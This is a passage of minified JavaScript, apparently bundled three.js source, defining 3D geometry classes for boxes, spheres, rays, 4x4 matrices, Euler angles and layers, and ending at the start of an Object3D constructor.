this.clampPoint(e.center,xe),xe.distanceToSquared(e.center)<=e.radius*e.radius}},{key:"intersectsPlane",value:function(e){var t,n;return n=0<e.normal.x?(t=e.normal.x*this.min.x,e.normal.x*this.max.x):(t=e.normal.x*this.max.x,e.normal.x*this.min.x),0<e.normal.y?(t+=e.normal.y*this.min.y,n+=e.normal.y*this.max.y):(t+=e.normal.y*this.max.y,n+=e.normal.y*this.min.y),0<e.normal.z?(t+=e.normal.z*this.min.z,n+=e.normal.z*this.max.z):(t+=e.normal.z*this.max.z,n+=e.normal.z*this.min.z),t<=-e.constant&&n>=-e.constant}},{key:"intersectsTriangle",value:function(e){if(this.isEmpty())return!1;this.getCenter(Ie),Fe.subVectors(this.max,Ie),ke.subVectors(e.a,Ie),Me.subVectors(e.b,Ie),Be.subVectors(e.c,Ie),Ee.subVectors(Me,ke),Te.subVectors(Be,Me),Pe.subVectors(ke,Be);var t=[0,-Ee.z,Ee.y,0,-Te.z,Te.y,0,-Pe.z,Pe.y,Ee.z,0,-Ee.x,Te.z,0,-Te.x,Pe.z,0,-Pe.x,-Ee.y,Ee.x,0,-Te.y,Te.x,0,-Pe.y,Pe.x,0];return!!Ne(t,ke,Me,Be,Fe)&&!!Ne(t=[1,0,0,0,1,0,0,0,1],ke,Me,Be,Fe)&&(Le.crossVectors(Ee,Te),Ne(t=[Le.x,Le.y,Le.z],ke,Me,Be,Fe))}},{key:"clampPoint",value:function(e,t){return t.copy(e).clamp(this.min,this.max)}},{key:"distanceToPoint",value:function(e){return xe.copy(e).clamp(this.min,this.max).sub(e).length()}},{key:"getBoundingSphere",value:function(e){return this.getCenter(e.center),e.radius=.5*this.getSize(xe).length(),e}},{key:"intersect",value:function(e){return this.min.max(e.min),this.max.min(e.max),this.isEmpty()&&this.makeEmpty(),this}},{key:"union",value:function(e){return this.min.min(e.min),this.max.max(e.max),this}},{key:"applyMatrix4",value:function(e){return this.isEmpty()||(Ce[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(e),Ce[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(e),Ce[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(e),Ce[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(e),Ce[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(e),Ce[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(e),Ce[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(e),Ce[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(e),this.setFromPoints(Ce)),this}},{key:"translate",value:function(e){return this.min.add(e),this.max.add(e),this}},{key:"equals",value:function(e){return e.min.equals(this.min)&&e.max.equals(this.max)}}]),e}();we.prototype.isBox3=!0;var Ce=[new ye,new ye,new ye,new ye,new ye,new ye,new ye,new ye],xe=new ye,Se=new we,ke=new ye,Me=new ye,Be=new ye,Ee=new ye,Te=new ye,Pe=new ye,Ie=new ye,Fe=new ye,Le=new ye,Oe=new ye;function Ne(e,t,n,r,i){for(var a=0,o=e.length-3;a<=o;a+=3){Oe.fromArray(e,a);var s=i.x*Math.abs(Oe.x)+i.y*Math.abs(Oe.y)+i.z*Math.abs(Oe.z),l=t.dot(Oe),c=n.dot(Oe),u=r.dot(Oe);if(Math.max(-Math.max(l,c,u),Math.min(l,c,u))>s)return!1}return!0}var De=new we,Re=new ye,je=new ye,Ue=new ye,$e=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:-1;_classCallCheck2(this,e),this.center=t,this.radius=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.center.copy(e),this.radius=t,this}},{key:"setFromPoints",value:function(e,t){var n=this.center;void 0!==t?n.copy(t):De.setFromPoints(e).getCenter(n);for(var r=0,i=0,a=e.length;i<a;i++)r=Math.max(r,n.distanceToSquared(e[i]));return this.radius=Math.sqrt(r),this}},{key:"copy",value:function(e){return this.center.copy(e.center),this.radius=e.radius,this}},{key:"isEmpty",value:function(){return this.radius<0}},{key:"makeEmpty",value:function(){return this.center.set(0,0,0),this.radius=-1,this}},{key:"containsPoint",value:function(e){return e.distanceToSquared(this.center)<=this.radius*this.radius}},{key:"distanceToPoint",value:function(e){return e.distanceTo(this.center)-this.radius}},{key:"intersectsSphere",value:function(e){var t=this.radius+e.radius;return e.center.distanceToSquared(this.center)<=t*t}},{key:"intersectsBox",value:function(e){return e.intersectsSphere(this)}},{key:"intersectsPlane",value:function(e){return Math.abs(e.distanceToPoint(this.center))<=this.radius}},{key:"clampPoint",value:function(e,t){var n=this.center.distanceToSquared(e);return t.copy(e),n>this.radius*this.radius&&(t.sub(this.center).normalize(),t.multiplyScalar(this.radius).add(this.center)),t}},{key:"getBoundingBox",value:function(e){return this.isEmpty()?e.makeEmpty():(e.set(this.center,this.center),e.expandByScalar(this.radius)),e}},{key:"applyMatrix4",value:function(e){return this.center.applyMatrix4(e),this.radius=this.radius*e.getMaxScaleOnAxis(),this}},{key:"translate",value:function(e){return this.center.add(e),this}},{key:"expandByPoint",value:function(e){Ue.subVectors(e,this.center);var t=Ue.lengthSq();if(t>this.radius*this.radius){var n=Math.sqrt(t),r=.5*(n-this.radius);this.center.add(Ue.multiplyScalar(r/n)),this.radius+=r}return this}},{key:"union",value:function(e){return!0===this.center.equals(e.center)?je.set(0,0,1).multiplyScalar(e.radius):je.subVectors(e.center,this.center).normalize().multiplyScalar(e.radius),this.expandByPoint(Re.copy(e.center).add(je)),this.expandByPoint(Re.copy(e.center).sub(je)),this}},{key:"equals",value:function(e){return e.center.equals(this.center)&&e.radius===this.radius}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}(),ze=new ye,He=new ye,Ve=new ye,Qe=new ye,Ge=new ye,We=new ye,Ke=new ye,qe=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:new ye,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:new ye(0,0,-1);_classCallCheck2(this,e),this.origin=t,this.direction=n}return _createClass2(e,[{key:"set",value:function(e,t){return this.origin.copy(e),this.direction.copy(t),this}},{key:"copy",value:function(e){return this.origin.copy(e.origin),this.direction.copy(e.direction),this}},{key:"at",value:function(e,t){return t.copy(this.direction).multiplyScalar(e).add(this.origin)}},{key:"lookAt",value:function(e){return this.direction.copy(e).sub(this.origin).normalize(),this}},{key:"recast",value:function(e){return this.origin.copy(this.at(e,ze)),this}},{key:"closestPointToPoint",value:function(e,t){t.subVectors(e,this.origin);var n=t.dot(this.direction);return n<0?t.copy(this.origin):t.copy(this.direction).multiplyScalar(n).add(this.origin)}},{key:"distanceToPoint",value:function(e){return Math.sqrt(this.distanceSqToPoint(e))}},{key:"distanceSqToPoint",value:function(e){var t=ze.subVectors(e,this.origin).dot(this.direction);return t<0?this.origin.distanceToSquared(e):(ze.copy(this.direction).multiplyScalar(t).add(this.origin),ze.distanceToSquared(e))}},{key:"distanceSqToSegment",value:function(e,t,n,r){He.copy(e).add(t).multiplyScalar(.5),Ve.copy(t).sub(e).normalize(),Qe.copy(this.origin).sub(He);var i,a,o,s,l=.5*e.distanceTo(t),c=-this.direction.dot(Ve),u=Qe.dot(this.direction),d=-Qe.dot(Ve),p=Qe.lengthSq(),h=Math.abs(1-c*c);if(0<h)if(a=c*u-d,s=l*h,0<=(i=c*d-u))if(-s<=a)if(a<=s){var f=1/h;o=(i*=f)*(i+c*(a*=f)+2*u)+a*(c*i+a+2*d)+p}else a=l,o=-(i=Math.max(0,-(c*a+u)))*i+a*(a+2*d)+p;else a=-l,o=-(i=Math.max(0,-(c*a+u)))*i+a*(a+2*d)+p;else o=a<=-s?-(i=Math.max(0,-(-c*l+u)))*i+(a=0<i?-l:Math.min(Math.max(-l,-d),l))*(a+2*d)+p:a<=s?(i=0,(a=Math.min(Math.max(-l,-d),l))*(a+2*d)+p):-(i=Math.max(0,-(c*l+u)))*i+(a=0<i?l:Math.min(Math.max(-l,-d),l))*(a+2*d)+p;else a=0<c?-l:l,o=-(i=Math.max(0,-(c*a+u)))*i+a*(a+2*d)+p;return n&&n.copy(this.direction).multiplyScalar(i).add(this.origin),r&&r.copy(Ve).multiplyScalar(a).add(He),o}},{key:"intersectSphere",value:function(e,t){ze.subVectors(e.center,this.origin);var n=ze.dot(this.direction),r=ze.dot(ze)-n*n,i=e.radius*e.radius;if(i<r)return null;var a=Math.sqrt(i-r),o=n-a,s=n+a;return o<0&&s<0?null:o<0?this.at(s,t):this.at(o,t)}},{key:"intersectsSphere",value:function(e){return this.distanceSqToPoint(e.center)<=e.radius*e.radius}},{key:"distanceToPlane",value:function(e){var t=e.normal.dot(this.direction);if(0===t)return 0===e.distanceToPoint(this.origin)?0:null;var n=-(this.origin.dot(e.normal)+e.constant)/t;return 0<=n?n:null}},{key:"intersectPlane",value:function(e,t){var n=this.distanceToPlane(e);return null===n?null:this.at(n,t)}},{key:"intersectsPlane",value:function(e){var t=e.distanceToPoint(this.origin);return 0===t||e.normal.dot(this.direction)*t<0}},{key:"intersectBox",value:function(e,t){var n,r,i,a,o,s,l=1/this.direction.x,c=1/this.direction.y,u=1/this.direction.z,d=this.origin;return r=0<=l?(n=(e.min.x-d.x)*l,(e.max.x-d.x)*l):(n=(e.max.x-d.x)*l,(e.min.x-d.x)*l),(a=0<=c?(i=(e.min.y-d.y)*c,(e.max.y-d.y)*c):(i=(e.max.y-d.y)*c,(e.min.y-d.y)*c))<n||r<i?null:((n<i||n!=n)&&(n=i),(a<r||r!=r)&&(r=a),(s=0<=u?(o=(e.min.z-d.z)*u,(e.max.z-d.z)*u):(o=(e.max.z-d.z)*u,(e.min.z-d.z)*u))<n||r<o?null:((n<o||n!=n)&&(n=o),(s<r||r!=r)&&(r=s),r<0?null:this.at(0<=n?n:r,t)))}},{key:"intersectsBox",value:function(e){return null!==this.intersectBox(e,ze)}},{key:"intersectTriangle",value:function(e,t,n,r,i){Ge.subVectors(t,e),We.subVectors(n,e),Ke.crossVectors(Ge,We);var a,o=this.direction.dot(Ke);if(0<o){if(r)return null;a=1}else{if(!(o<0))return null;a=-1,o=-o}Qe.subVectors(this.origin,e);var s=a*this.direction.dot(We.crossVectors(Qe,We));if(s<0)return null;var l=a*this.direction.dot(Ge.cross(Qe));if(l<0)return null;if(o<s+l)return null;var c=-a*Qe.dot(Ke);return c<0?null:this.at(c/o,i)}},{key:"applyMatrix4",value:function(e){return this.origin.applyMatrix4(e),this.direction.transformDirection(e),this}},{key:"equals",value:function(e){return e.origin.equals(this.origin)&&e.direction.equals(this.direction)}},{key:"clone",value:function(){return(new this.constructor).copy(this)}}]),e}(),Xe=function(){function e(){_classCallCheck2(this,e),this.elements=[1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1]}return _createClass2(e,[{key:"set",value:function(e,t,n,r,i,a,o,s,l,c,u,d,p,h,f,A){var m=this.elements;return m[0]=e,m[4]=t,m[8]=n,m[12]=r,m[1]=i,m[5]=a,m[9]=o,m[13]=s,m[2]=l,m[6]=c,m[10]=u,m[14]=d,m[3]=p,m[7]=h,m[11]=f,m[15]=A,this}},{key:"identity",value:function(){return this.set(1,0,0,0,0,1,0,0,0,0,1,0,0,0,0,1),this}},{key:"clone",value:function(){return(new e).fromArray(this.elements)}},{key:"copy",value:function(e){var t=this.elements,n=e.elements;return t[0]=n[0],t[1]=n[1],t[2]=n[2],t[3]=n[3],t[4]=n[4],t[5]=n[5],t[6]=n[6],t[7]=n[7],t[8]=n[8],t[9]=n[9],t[10]=n[10],t[11]=n[11],t[12]=n[12],t[13]=n[13],t[14]=n[14],t[15]=n[15],this}},{key:"copyPosition",value:function(e){var t=this.elements,n=e.elements;return t[12]=n[12],t[13]=n[13],t[14]=n[14],this}},{key:"setFromMatrix3",value:function(e){var t=e.elements;return this.set(t[0],t[3],t[6],0,t[1],t[4],t[7],0,t[2],t[5],t[8],0,0,0,0,1),this}},{key:"extractBasis",value:function(e,t,n){return e.setFromMatrixColumn(this,0),t.setFromMatrixColumn(this,1),n.setFromMatrixColumn(this,2),this}},{key:"makeBasis",value:function(e,t,n){return this.set(e.x,t.x,n.x,0,e.y,t.y,n.y,0,e.z,t.z,n.z,0,0,0,0,1),this}},{key:"extractRotation",value:function(e){var t=this.elements,n=e.elements,r=1/Ye.setFromMatrixColumn(e,0).length(),i=1/Ye.setFromMatrixColumn(e,1).length(),a=1/Ye.setFromMatrixColumn(e,2).length();return t[0]=n[0]*r,t[1]=n[1]*r,t[2]=n[2]*r,t[3]=0,t[4]=n[4]*i,t[5]=n[5]*i,t[6]=n[6]*i,t[7]=0,t[8]=n[8]*a,t[9]=n[9]*a,t[10]=n[10]*a,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this}},{key:"makeRotationFromEuler",value:function(e){!e||e.isEuler;var t=this.elements,n=e.x,r=e.y,i=e.z,a=Math.cos(n),o=Math.sin(n),s=Math.cos(r),l=Math.sin(r),c=Math.cos(i),u=Math.sin(i);if("XYZ"===e.order){var d=a*c,p=a*u,h=o*c,f=o*u;t[0]=s*c,t[4]=-s*u,t[8]=l,t[1]=p+h*l,t[5]=d-f*l,t[9]=-o*s,t[2]=f-d*l,t[6]=h+p*l,t[10]=a*s}else if("YXZ"===e.order){var A=s*c,m=s*u,v=l*c,g=l*u;t[0]=A+g*o,t[4]=v*o-m,t[8]=a*l,t[1]=a*u,t[5]=a*c,t[9]=-o,t[2]=m*o-v,t[6]=g+A*o,t[10]=a*s}else if("ZXY"===e.order){var y=s*c,b=s*u,_=l*c,w=l*u;t[0]=y-w*o,t[4]=-a*u,t[8]=_+b*o,t[1]=b+_*o,t[5]=a*c,t[9]=w-y*o,t[2]=-a*l,t[6]=o,t[10]=a*s}else if("ZYX"===e.order){var C=a*c,x=a*u,S=o*c,k=o*u;t[0]=s*c,t[4]=S*l-x,t[8]=C*l+k,t[1]=s*u,t[5]=k*l+C,t[9]=x*l-S,t[2]=-l,t[6]=o*s,t[10]=a*s}else if("YZX"===e.order){var M=a*s,B=a*l,E=o*s,T=o*l;t[0]=s*c,t[4]=T-M*u,t[8]=E*u+B,t[1]=u,t[5]=a*c,t[9]=-o*c,t[2]=-l*c,t[6]=B*u+E,t[10]=M-T*u}else if("XZY"===e.order){var P=a*s,I=a*l,F=o*s,L=o*l;t[0]=s*c,t[4]=-u,t[8]=l*c,t[1]=P*u+L,t[5]=a*c,t[9]=I*u-F,t[2]=F*u-I,t[6]=o*c,t[10]=L*u+P}return t[3]=0,t[7]=0,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,this}},{key:"makeRotationFromQuaternion",value:function(e){return this.compose(Ze,e,et)}},{key:"lookAt",value:function(e,t,n){var r=this.elements;return rt.subVectors(e,t),0===rt.lengthSq()&&(rt.z=1),rt.normalize(),tt.crossVectors(n,rt),0===tt.lengthSq()&&(1===Math.abs(n.z)?rt.x+=1e-4:rt.z+=1e-4,rt.normalize(),tt.crossVectors(n,rt)),tt.normalize(),nt.crossVectors(rt,tt),r[0]=tt.x,r[4]=nt.x,r[8]=rt.x,r[1]=tt.y,r[5]=nt.y,r[9]=rt.y,r[2]=tt.z,r[6]=nt.z,r[10]=rt.z,this}},{key:"multiply",value:function(e,t){return void 0!==t?this.multiplyMatrices(e,t):this.multiplyMatrices(this,e)}},{key:"premultiply",value:function(e){return this.multiplyMatrices(e,this)}},{key:"multiplyMatrices",value:function(e,t){var n=e.elements,r=t.elements,i=this.elements,a=n[0],o=n[4],s=n[8],l=n[12],c=n[1],u=n[5],d=n[9],p=n[13],h=n[2],f=n[6],A=n[10],m=n[14],v=n[3],g=n[7],y=n[11],b=n[15],_=r[0],w=r[4],C=r[8],x=r[12],S=r[1],k=r[5],M=r[9],B=r[13],E=r[2],T=r[6],P=r[10],I=r[14],F=r[3],L=r[7],O=r[11],N=r[15];return i[0]=a*_+o*S+s*E+l*F,i[4]=a*w+o*k+s*T+l*L,i[8]=a*C+o*M+s*P+l*O,i[12]=a*x+o*B+s*I+l*N,i[1]=c*_+u*S+d*E+p*F,i[5]=c*w+u*k+d*T+p*L,i[9]=c*C+u*M+d*P+p*O,i[13]=c*x+u*B+d*I+p*N,i[2]=h*_+f*S+A*E+m*F,i[6]=h*w+f*k+A*T+m*L,i[10]=h*C+f*M+A*P+m*O,i[14]=h*x+f*B+A*I+m*N,i[3]=v*_+g*S+y*E+b*F,i[7]=v*w+g*k+y*T+b*L,i[11]=v*C+g*M+y*P+b*O,i[15]=v*x+g*B+y*I+b*N,this}},{key:"multiplyScalar",value:function(e){var t=this.elements;return t[0]*=e,t[4]*=e,t[8]*=e,t[12]*=e,t[1]*=e,t[5]*=e,t[9]*=e,t[13]*=e,t[2]*=e,t[6]*=e,t[10]*=e,t[14]*=e,t[3]*=e,t[7]*=e,t[11]*=e,t[15]*=e,this}},{key:"determinant",value:function(){var e=this.elements,t=e[0],n=e[4],r=e[8],i=e[12],a=e[1],o=e[5],s=e[9],l=e[13],c=e[2],u=e[6],d=e[10],p=e[14];return e[3]*(+i*s*u-r*l*u-i*o*d+n*l*d+r*o*p-n*s*p)+e[7]*(+t*s*p-t*l*d+i*a*d-r*a*p+r*l*c-i*s*c)+e[11]*(+t*l*u-t*o*p-i*a*u+n*a*p+i*o*c-n*l*c)+e[15]*(-r*o*c-t*s*u+t*o*d+r*a*u-n*a*d+n*s*c)}},{key:"transpose",value:function(){var e,t=this.elements;return e=t[1],t[1]=t[4],t[4]=e,e=t[2],t[2]=t[8],t[8]=e,e=t[6],t[6]=t[9],t[9]=e,e=t[3],t[3]=t[12],t[12]=e,e=t[7],t[7]=t[13],t[13]=e,e=t[11],t[11]=t[14],t[14]=e,this}},{key:"setPosition",value:function(e,t,n){var r=this.elements;return e.isVector3?(r[12]=e.x,r[13]=e.y,r[14]=e.z):(r[12]=e,r[13]=t,r[14]=n),this}},{key:"invert",value:function(){var e=this.elements,t=e[0],n=e[1],r=e[2],i=e[3],a=e[4],o=e[5],s=e[6],l=e[7],c=e[8],u=e[9],d=e[10],p=e[11],h=e[12],f=e[13],A=e[14],m=e[15],v=u*A*l-f*d*l+f*s*p-o*A*p-u*s*m+o*d*m,g=h*d*l-c*A*l-h*s*p+a*A*p+c*s*m-a*d*m,y=c*f*l-h*u*l+h*o*p-a*f*p-c*o*m+a*u*m,b=h*u*s-c*f*s-h*o*d+a*f*d+c*o*A-a*u*A,_=t*v+n*g+r*y+i*b;if(0===_)return this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);var w=1/_;return e[0]=v*w,e[1]=(f*d*i-u*A*i-f*r*p+n*A*p+u*r*m-n*d*m)*w,e[2]=(o*A*i-f*s*i+f*r*l-n*A*l-o*r*m+n*s*m)*w,e[3]=(u*s*i-o*d*i-u*r*l+n*d*l+o*r*p-n*s*p)*w,e[4]=g*w,e[5]=(c*A*i-h*d*i+h*r*p-t*A*p-c*r*m+t*d*m)*w,e[6]=(h*s*i-a*A*i-h*r*l+t*A*l+a*r*m-t*s*m)*w,e[7]=(a*d*i-c*s*i+c*r*l-t*d*l-a*r*p+t*s*p)*w,e[8]=y*w,e[9]=(h*u*i-c*f*i-h*n*p+t*f*p+c*n*m-t*u*m)*w,e[10]=(a*f*i-h*o*i+h*n*l-t*f*l-a*n*m+t*o*m)*w,e[11]=(c*o*i-a*u*i-c*n*l+t*u*l+a*n*p-t*o*p)*w,e[12]=b*w,e[13]=(c*f*r-h*u*r+h*n*d-t*f*d-c*n*A+t*u*A)*w,e[14]=(h*o*r-a*f*r-h*n*s+t*f*s+a*n*A-t*o*A)*w,e[15]=(a*u*r-c*o*r+c*n*s-t*u*s-a*n*d+t*o*d)*w,this}},{key:"scale",value:function(e){var t=this.elements,n=e.x,r=e.y,i=e.z;return t[0]*=n,t[4]*=r,t[8]*=i,t[1]*=n,t[5]*=r,t[9]*=i,t[2]*=n,t[6]*=r,t[10]*=i,t[3]*=n,t[7]*=r,t[11]*=i,this}},{key:"getMaxScaleOnAxis",value:function(){var e=this.elements,t=e[0]*e[0]+e[1]*e[1]+e[2]*e[2],n=e[4]*e[4]+e[5]*e[5]+e[6]*e[6],r=e[8]*e[8]+e[9]*e[9]+e[10]*e[10];return Math.sqrt(Math.max(t,n,r))}},{key:"makeTranslation",value:function(e,t,n){return this.set(1,0,0,e,0,1,0,t,0,0,1,n,0,0,0,1),this}},{key:"makeRotationX",value:function(e){var t=Math.cos(e),n=Math.sin(e);return this.set(1,0,0,0,0,t,-n,0,0,n,t,0,0,0,0,1),this}},{key:"makeRotationY",value:function(e){var t=Math.cos(e),n=Math.sin(e);return this.set(t,0,n,0,0,1,0,0,-n,0,t,0,0,0,0,1),this}},{key:"makeRotationZ",value:function(e){var t=Math.cos(e),n=Math.sin(e);return this.set(t,-n,0,0,n,t,0,0,0,0,1,0,0,0,0,1),this}},{key:"makeRotationAxis",value:function(e,t){var n=Math.cos(t),r=Math.sin(t),i=1-n,a=e.x,o=e.y,s=e.z,l=i*a,c=i*o;return this.set(l*a+n,l*o-r*s,l*s+r*o,0,l*o+r*s,c*o+n,c*s-r*a,0,l*s-r*o,c*s+r*a,i*s*s+n,0,0,0,0,1),this}},{key:"makeScale",value:function(e,t,n){return this.set(e,0,0,0,0,t,0,0,0,0,n,0,0,0,0,1),this}},{key:"makeShear",value:function(e,t,n,r,i,a){return this.set(1,n,i,0,e,1,a,0,t,r,1,0,0,0,0,1),this}},{key:"compose",value:function(e,t,n){var r=this.elements,i=t._x,a=t._y,o=t._z,s=t._w,l=i+i,c=a+a,u=o+o,d=i*l,p=i*c,h=i*u,f=a*c,A=a*u,m=o*u,v=s*l,g=s*c,y=s*u,b=n.x,_=n.y,w=n.z;return r[0]=(1-(f+m))*b,r[1]=(p+y)*b,r[2]=(h-g)*b,r[3]=0,r[4]=(p-y)*_,r[5]=(1-(d+m))*_,r[6]=(A+v)*_,r[7]=0,r[8]=(h+g)*w,r[9]=(A-v)*w,r[10]=(1-(d+f))*w,r[11]=0,r[12]=e.x,r[13]=e.y,r[14]=e.z,r[15]=1,this}},{key:"decompose",value:function(e,t,n){var r=this.elements,i=Ye.set(r[0],r[1],r[2]).length(),a=Ye.set(r[4],r[5],r[6]).length(),o=Ye.set(r[8],r[9],r[10]).length();this.determinant()<0&&(i=-i),e.x=r[12],e.y=r[13],e.z=r[14],Je.copy(this);var s=1/i,l=1/a,c=1/o;return Je.elements[0]*=s,Je.elements[1]*=s,Je.elements[2]*=s,Je.elements[4]*=l,Je.elements[5]*=l,Je.elements[6]*=l,Je.elements[8]*=c,Je.elements[9]*=c,Je.elements[10]*=c,t.setFromRotationMatrix(Je),n.x=i,n.y=a,n.z=o,this}},{key:"makePerspective",value:function(e,t,n,r,i,a){var o=this.elements,s=2*i/(t-e),l=2*i/(n-r),c=(t+e)/(t-e),u=(n+r)/(n-r),d=-(a+i)/(a-i),p=-2*a*i/(a-i);return o[0]=s,o[4]=0,o[8]=c,o[12]=0,o[1]=0,o[5]=l,o[9]=u,o[13]=0,o[2]=0,o[6]=0,o[10]=d,o[14]=p,o[3]=0,o[7]=0,o[11]=-1,o[15]=0,this}},{key:"makeOrthographic",value:function(e,t,n,r,i,a){var o=this.elements,s=1/(t-e),l=1/(n-r),c=1/(a-i),u=(t+e)*s,d=(n+r)*l,p=(a+i)*c;return o[0]=2*s,o[4]=0,o[8]=0,o[12]=-u,o[1]=0,o[5]=2*l,o[9]=0,o[13]=-d,o[2]=0,o[6]=0,o[10]=-2*c,o[14]=-p,o[3]=0,o[7]=0,o[11]=0,o[15]=1,this}},{key:"equals",value:function(e){for(var t=this.elements,n=e.elements,r=0;r<16;r++)if(t[r]!==n[r])return!1;return!0}},{key:"fromArray",value:function(e){for(var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=0;n<16;n++)this.elements[n]=e[n+t];return this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,n=this.elements;return e[t]=n[0],e[t+1]=n[1],e[t+2]=n[2],e[t+3]=n[3],e[t+4]=n[4],e[t+5]=n[5],e[t+6]=n[6],e[t+7]=n[7],e[t+8]=n[8],e[t+9]=n[9],e[t+10]=n[10],e[t+11]=n[11],e[t+12]=n[12],e[t+13]=n[13],e[t+14]=n[14],e[t+15]=n[15],e}}]),e}();Xe.prototype.isMatrix4=!0;var Ye=new ye,Je=new Xe,Ze=new ye(0,0,0),et=new ye(1,1,1),tt=new ye,nt=new ye,rt=new ye,it=new Xe,at=new ge,ot=function(){function e(){var t=0<arguments.length&&void 0!==arguments[0]?arguments[0]:0,n=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0,r=2<arguments.length&&void 0!==arguments[2]?arguments[2]:0,i=3<arguments.length&&void 0!==arguments[3]?arguments[3]:e.DefaultOrder;_classCallCheck2(this,e),this._x=t,this._y=n,this._z=r,this._order=i}return _createClass2(e,[{key:"set",value:function(e,t,n){var r=3<arguments.length&&void 0!==arguments[3]?arguments[3]:this._order;return this._x=e,this._y=t,this._z=n,this._order=r,this._onChangeCallback(),this}},{key:"clone",value:function(){return new this.constructor(this._x,this._y,this._z,this._order)}},{key:"copy",value:function(e){return this._x=e._x,this._y=e._y,this._z=e._z,this._order=e._order,this._onChangeCallback(),this}},{key:"setFromRotationMatrix",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:this._order,n=!(2<arguments.length&&void 0!==arguments[2])||arguments[2],r=e.elements,i=r[0],a=r[4],o=r[8],s=r[1],l=r[5],c=r[9],u=r[2],d=r[6],p=r[10];switch(t){case"XYZ":this._y=Math.asin(X(o,-1,1)),Math.abs(o)<.9999999?(this._x=Math.atan2(-c,p),this._z=Math.atan2(-a,i)):(this._x=Math.atan2(d,l),this._z=0);break;case"YXZ":this._x=Math.asin(-X(c,-1,1)),Math.abs(c)<.9999999?(this._y=Math.atan2(o,p),this._z=Math.atan2(s,l)):(this._y=Math.atan2(-u,i),this._z=0);break;case"ZXY":this._x=Math.asin(X(d,-1,1)),Math.abs(d)<.9999999?(this._y=Math.atan2(-u,p),this._z=Math.atan2(-a,l)):(this._y=0,this._z=Math.atan2(s,i));break;case"ZYX":this._y=Math.asin(-X(u,-1,1)),Math.abs(u)<.9999999?(this._x=Math.atan2(d,p),this._z=Math.atan2(s,i)):(this._x=0,this._z=Math.atan2(-a,l));break;case"YZX":this._z=Math.asin(X(s,-1,1)),Math.abs(s)<.9999999?(this._x=Math.atan2(-c,l),this._y=Math.atan2(-u,i)):(this._x=0,this._y=Math.atan2(o,p));break;case"XZY":this._z=Math.asin(-X(a,-1,1)),Math.abs(a)<.9999999?(this._x=Math.atan2(d,l),this._y=Math.atan2(o,i)):(this._x=Math.atan2(-c,p),this._y=0)}return this._order=t,!0===n&&this._onChangeCallback(),this}},{key:"setFromQuaternion",value:function(e,t,n){return it.makeRotationFromQuaternion(e),this.setFromRotationMatrix(it,t,n)}},{key:"setFromVector3",value:function(e){var t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:this._order;return this.set(e.x,e.y,e.z,t)}},{key:"reorder",value:function(e){return at.setFromEuler(this),this.setFromQuaternion(at,e)}},{key:"equals",value:function(e){return e._x===this._x&&e._y===this._y&&e._z===this._z&&e._order===this._order}},{key:"fromArray",value:function(e){return this._x=e[0],this._y=e[1],this._z=e[2],void 0!==e[3]&&(this._order=e[3]),this._onChangeCallback(),this}},{key:"toArray",value:function(){var e=0<arguments.length&&void 0!==arguments[0]?arguments[0]:[],t=1<arguments.length&&void 0!==arguments[1]?arguments[1]:0;return e[t]=this._x,e[t+1]=this._y,e[t+2]=this._z,e[t+3]=this._order,e}},{key:"toVector3",value:function(e){return e?e.set(this._x,this._y,this._z):new ye(this._x,this._y,this._z)}},{key:"_onChange",value:function(e){return this._onChangeCallback=e,this}},{key:"_onChangeCallback",value:function(){}},{key:"x",get:function(){return this._x},set:function(e){this._x=e,this._onChangeCallback()}},{key:"y",get:function(){return this._y},set:function(e){this._y=e,this._onChangeCallback()}},{key:"z",get:function(){return this._z},set:function(e){this._z=e,this._onChangeCallback()}},{key:"order",get:function(){return this._order},set:function(e){this._order=e,this._onChangeCallback()}}]),e}();ot.prototype.isEuler=!0,ot.DefaultOrder="XYZ",ot.RotationOrders=["XYZ","YZX","ZXY","XZY","YXZ","ZYX"];var st=function(){function e(){_classCallCheck2(this,e),this.mask=1}return _createClass2(e,[{key:"set",value:function(e){this.mask=(1<<e|0)>>>0}},{key:"enable",value:function(e){this.mask|=1<<e|0}},{key:"enableAll",value:function(){this.mask=-1}},{key:"toggle",value:function(e){this.mask^=1<<e|0}},{key:"disable",value:function(e){this.mask&=~(1<<e|0)}},{key:"disableAll",value:function(){this.mask=0}},{key:"test",value:function(e){return 0!=(this.mask&e.mask)}},{key:"isEnabled",value:function(e){return 0!=(this.mask&(1<<e|0))}}]),e}(),lt=0,ct=new ye,ut=new ge,dt=new Xe,pt=new ye,ht=new ye,ft=new ye,At=new ge,mt=new ye(1,0,0),vt=new ye(0,1,0),gt=new ye(0,0,1),yt={type:"added"},bt={type:"removed"},_t=function(e){_inherits2(n,H);var t=_createSuper(n);function n(){var e;_classCallCheck2(this,n),e=t.call(this),Object.defineProperty(_assertThisInitialized2(e),"id",{value:lt++}),e.uuid=q(),e.name="",e.type="Object3D",e.parent=null,e.children=[],e.up=n.DefaultUp.clone();var r=new ye,i=new ot,a=new ge,o=new ye(1,1,1);return i._onChange((function(){a.setFromEuler(i,!1)})),a._onChange((function(){i.setFromQuaternion(a,void 